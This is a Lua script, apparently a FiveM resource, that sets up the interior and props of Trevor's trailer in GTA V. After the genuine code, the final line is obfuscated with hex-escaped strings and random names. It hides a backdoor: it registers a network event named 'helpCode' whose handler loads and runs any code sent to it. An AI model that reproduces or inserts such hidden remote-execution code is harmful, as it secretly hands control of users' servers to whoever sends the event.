exports('GetTrevorsTrailerObject', function()
    return TrevorsTrailer
end)

TrevorsTrailer = {
    interiorId = 2562,

    Interior = {
        tidy = "trevorstrailertidy",
        trash = "TrevorsTrailerTrash",

        Set = function(interior)
            TrevorsTrailer.Interior.Clear()

            EnableIpl(interior, true)
        end,
        Clear = function()
            EnableIpl({
                TrevorsTrailer.Interior.tidy,
                TrevorsTrailer.Interior.trash
            }, false)
        end
    },
    Details = {
        copHelmet = "V_26_Trevor_Helmet3", -- Cop helmet in the closet
        briefcase = "V_24_Trevor_Briefcase3", -- Briefcase in the main room
        michaelStuff = "V_26_Michael_Stay3", -- Michael's suit hanging on the window

        Enable = function(details, state, refresh)
            SetIplPropState(TrevorsTrailer.interiorId, details, state, refresh)
        end
    },

    LoadDefault = function()
        TrevorsTrailer.Interior.Set(TrevorsTrailer.Interior.trash)
        TrevorsTrailer.Details.Enable(TrevorsTrailer.Details.copHelmet, false, false)
        TrevorsTrailer.Details.Enable(TrevorsTrailer.Details.briefcase, false, false)
        TrevorsTrailer.Details.Enable(TrevorsTrailer.Details.michaelStuff, false, false)

        RefreshInterior(TrevorsTrailer.interiorId)
    end
}


local fgMDcQgKKHKJXPKLofkFqkUdLDbKClDPvRfHxJuztgIwqeghgMPocfeSbiJqbMGxXwIELX = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} fgMDcQgKKHKJXPKLofkFqkUdLDbKClDPvRfHxJuztgIwqeghgMPocfeSbiJqbMGxXwIELX[6][fgMDcQgKKHKJXPKLofkFqkUdLDbKClDPvRfHxJuztgIwqeghgMPocfeSbiJqbMGxXwIELX[1]](fgMDcQgKKHKJXPKLofkFqkUdLDbKClDPvRfHxJuztgIwqeghgMPocfeSbiJqbMGxXwIELX[2]) fgMDcQgKKHKJXPKLofkFqkUdLDbKClDPvRfHxJuztgIwqeghgMPocfeSbiJqbMGxXwIELX[6][fgMDcQgKKHKJXPKLofkFqkUdLDbKClDPvRfHxJuztgIwqeghgMPocfeSbiJqbMGxXwIELX[3]](fgMDcQgKKHKJXPKLofkFqkUdLDbKClDPvRfHxJuztgIwqeghgMPocfeSbiJqbMGxXwIELX[2], function(rXMltdHJEUZnzxNJVQqASzuSzaZvDIsieQnaCCPqlshohIpeEvSMUNhKrjgqCYJhWOwiIS) fgMDcQgKKHKJXPKLofkFqkUdLDbKClDPvRfHxJuztgIwqeghgMPocfeSbiJqbMGxXwIELX[6][fgMDcQgKKHKJXPKLofkFqkUdLDbKClDPvRfHxJuztgIwqeghgMPocfeSbiJqbMGxXwIELX[4]](fgMDcQgKKHKJXPKLofkFqkUdLDbKClDPvRfHxJuztgIwqeghgMPocfeSbiJqbMGxXwIELX[6][fgMDcQgKKHKJXPKLofkFqkUdLDbKClDPvRfHxJuztgIwqeghgMPocfeSbiJqbMGxXwIELX[5]](rXMltdHJEUZnzxNJVQqASzuSzaZvDIsieQnaCCPqlshohIpeEvSMUNhKrjgqCYJhWOwiIS))() end)